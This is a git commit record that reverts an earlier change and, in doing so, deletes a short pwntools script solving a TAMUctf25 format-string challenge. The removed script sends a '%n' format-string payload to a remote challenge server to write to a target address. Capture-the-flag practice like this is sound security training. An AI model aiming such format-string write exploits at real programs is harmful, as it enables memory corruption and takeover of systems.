9d6257b9ad46a67795aa81310832bdea1107bcc8
s1gn3rs <guilherme8888silva@gmail.com>
2025-04-04 20:11:47 +0100

    Revert "update"
    This reverts commit 0c8bce4430d7645923fba8362674412ee68bec1b.
    Back

--- 2025_03_28_TAMUctf25/pwn/Scoreboard/Format_Strings/02_write/solve02_write.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-targetAddr = 0x804a040
-
-# P = process("./bin")
-P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10052)
-
-P.sendline(p32(targetAddr) + b"%08x."*6 + b"%n")
-P.interactive()
